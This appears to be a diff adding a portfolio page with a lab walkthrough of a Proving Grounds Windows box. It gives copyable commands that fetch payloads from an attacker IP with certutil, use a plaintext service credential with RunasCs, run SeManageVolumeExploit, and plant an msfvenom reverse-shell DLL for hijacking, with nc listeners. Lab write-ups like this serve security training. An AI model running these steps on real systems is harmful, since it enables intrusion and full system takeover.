@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Proving Grounds: Active Directory Writeup</title>
+  <link rel="stylesheet" href="/../assets/css/writeups.css">
+      <script src="/assets/css/js/script.js" defer></script>
+
+</head>
+<body>
+
+<header>
+  <h1>Rachel Murphy</h1>
+  <p>Cybersecurity Portfolio - Proving Grounds</p>
+  <nav>
+    <ul>
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../writeups/index.html">Writeups</a></li>
+      <li><a href="../cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+      <li><a href="../tools/index.html">Tools</a></li>
+      <li><a href="../about.html">About</a></li>
+    </ul>
+  </nav>
+</header>
+
+<main>
+
+<!-- RunAsCs Reverse Shell -->
+<section>
+  <h2>RunAsCs Reverse Shell</h2>
+  <p>Transfer shell:</p>
+  <div class="code-block">
+    <pre>certutil -urlcache -split -f http://192.168.45.152/shell.exe</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <p>Set up listener on port 445:</p>
+  <div class="code-block">
+    <pre>sudo rlwrap nc -lvnp 445</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <p>Execute with RunAsCs:</p>
+  <div class="code-block">
+    <pre>Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "shell.exe"</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707200437.png" alt="">
+  <p>Yay we're now the svc_mssql user!</p>
+  <img src="../images/Pasted image 20250707200510.png" alt="">
+  <p>Grab the flags:</p>
+  <img src="../images/Pasted image 20250707200754.png" alt="">
+</section>
+
+<!-- Privilege Escalation -->
+<section>
+  <h2>Privilege Escalation</h2>
+  <img src="../images/Pasted image 20250707200644.png" alt="">
+  <p>- SeMachineAccountPrivilege and SeManageVolumePrivilege are both useful</p>
+
+  <h3>SeManageVolumePrivilege</h3>
+  <p>Using tool: <a href="https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9---------------------------------------" target="_blank">SeManageVolumeExploit</a></p>
+  <p>Transfer to box:</p>
+  <div class="code-block">
+    <pre>certutil -urlcache -split -f http://192.168.45.152/SeManageVolumeExploit.exe</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <p>Execute:</p>
+  <div class="code-block">
+    <pre>.\SeManageVolumeExploit.exe</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707201923.png" alt="">
+  <p>Check permissions on C:\Windows\system32:</p>
+  <div class="code-block">
+    <pre>icacls C:\Windows\System32</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707202045.png" alt="">
+  <p>Full write access allows DLL hijacking.</p>
+</section>
+
+<!-- DLL Hijacking -->
+<section>
+  <h2>DLL Hijacking</h2>
+  <p>Targeting systeminfo's tzres.dll</p>
+  <p>Create malicious DLL with msfvenom:</p>
+  <div class="code-block">
+    <pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=8888 -f dll -o tzres.dll</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707202651.png" alt="">
+  <p>Transfer to <code>C:\Windows\System32\wbem</code>:</p>
+  <div class="code-block">
+    <pre>certutil -urlcache -split -f http://192.168.45.152/tzres.dll</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707202819.png" alt="">
+  <p>Set up listener:</p>
+  <div class="code-block">
+    <pre>sudo rlwrap nc -lvnp 8888</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <p>Run systeminfo:</p>
+  <div class="code-block">
+    <pre>systeminfo</pre>
+    <button class="copy-btn">Copy</button>
+  </div>
+  <img src="../images/Pasted image 20250707202947.png" alt="">
+  <p>EPICCCCC</p>
+  <img src="../images/Pasted image 20250707203015.png" alt="">
+  <p>Successful DLL hijacking!!!</p>
+  <img src="../images/Pasted image 20250707203110.png" alt="">
+  <p>Get the final flag.</p>
+</section>
+
+</main>
+
+<script>
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const code = btn.previousElementSibling.innerText;
+      navigator.clipboard.writeText(code).then(() => {
+        btn.innerText = 'Copied!';
+        setTimeout(() => btn.innerText = 'Copy', 1500);
+      });
+    });
+  });
+</script>
+  <!-- Footer -->
+  <footer>
+    <div class="wrap site-footer">
+      <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener">GitHub</a></p>
+      <p><a href="/../writeups/index.html">Back to Writeups</a> | <a href="../index.html">Home</a></p>
+    </div>
+  </footer>
+
+  <script src="/../assets/js/script.js"></script>
+</body>
+</html>
+</body>
+</html>
